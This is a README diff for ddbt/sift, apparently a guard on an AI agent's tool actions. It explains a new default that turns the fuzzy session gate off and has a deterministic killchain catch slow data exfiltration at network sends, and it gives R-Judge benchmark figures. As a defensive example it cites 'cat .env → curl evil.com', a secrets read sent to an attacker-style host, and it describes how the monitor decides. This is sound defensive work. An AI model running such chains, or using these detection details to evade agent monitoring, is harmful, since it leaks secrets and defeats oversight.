@@ -288,11 +288,11 @@ guard can't win it.
 
 ¹ **This R-Judge row is the capability ceiling — the session "slow check" set to `more`** (`traj_gate=0.85`).
 That gate scores the whole session at once and lifts recall to 73.8%, but at spec 45.5% it also turns *over half*
-of benign multi-step sessions into an ASK — too noisy for interactive use. So the slow check is a **tunable env
-knob, `DDBT_SLOW_CHECK`**, and defaults to **`less`** (0.98 — above the benign interactive ceiling, so it stays
-quiet). With the default, held-out R-Judge is F1 ≈ 58% (recall 55 · spec 56); the deterministic killchain
-(data-access → external send) + provenance taint carry slow-attack detection without the nagging. Set
-`DDBT_SLOW_CHECK=more` for non-interactive audit/batch runs, or `off` to disable it entirely.
+of benign multi-step sessions into an ASK — too noisy for interactive use. So the fuzzy whole-session gate is a **tunable env knob, `DDBT_SLOW_CHECK`**,
+and **defaults to `off`** — the deterministic **killchain** does slow-exfil detection instead, precisely and
+*only at a network send* (see below). With the gate off, held-out R-Judge is F1 ≈ 58% (recall 55 · spec 56).
+Set `DDBT_SLOW_CHECK=less` (0.98, quiet) or `more` (0.85, aggressive) to add the fuzzy backstop for
+non-interactive audit/batch runs.
 
 ![sift vs LLM across benchmarks](./doc/bench_sift_vs_llm.svg)
 
@@ -312,11 +312,14 @@ model (see [`sift/`](sift/)) — no LLM, no API, no network, **$0 and sub-millis
   looks unsafe, lifting held-out R-Judge F1 to 67. But the static-embedding head barely discriminates at the
   session level (a benign shell run and a real read→encode→send both score ≈0.96), so at any usable threshold
   it flags over half of benign sessions — pure nagging in an interactive shell. So it **defaults off**
-  (`traj_gate=0`); the deterministic **killchain** does the real slow-attack detection: it fires only when
-  sensitive data was actually *accessed* and a later step *sends it to an external destination* — a run of
-  ordinary commands (`ls`, `cat notes`, `git status`, a couple of curls to trusted hosts) is never a chain.
-  (A frozen small transformer, MiniLM, was tested as the encoder and did **not** beat the static model — so
-  ddbt stays torch-free.)
+  (`traj_gate=0`); the deterministic **killchain** does the real slow-exfil detection, and does it **only at
+  a network send** — the one moment data can actually leave. Every step quietly records *whether it touched
+  sensitive data*; when a `curl`/`scp`/POST to an **external** host fires, the killchain looks back over the
+  whole session at full vigour (secret read, staging, recon, encoding) and DENYs a real exfil chain / ASKs on
+  a softer one. On any non-network command it does nothing — so a run of ordinary commands (`ls`, `cat notes`,
+  `git status`, curls to trusted hosts) is never a chain, while `cat .env → curl evil.com` is stopped at the
+  curl. (A frozen small transformer, MiniLM, was tested as the encoder and did **not** beat the static model —
+  so ddbt stays torch-free.)
 - **R-Judge scores every ASK as a false positive** (it's binary — no "ask a human" bucket) — but an
   ASK is ddbt's *feature*, not a miss, so sift's F1 here is a **lower bound**. ddbt never blocks the
   agent from *talking to you*; only tool actions with external effect are gated.
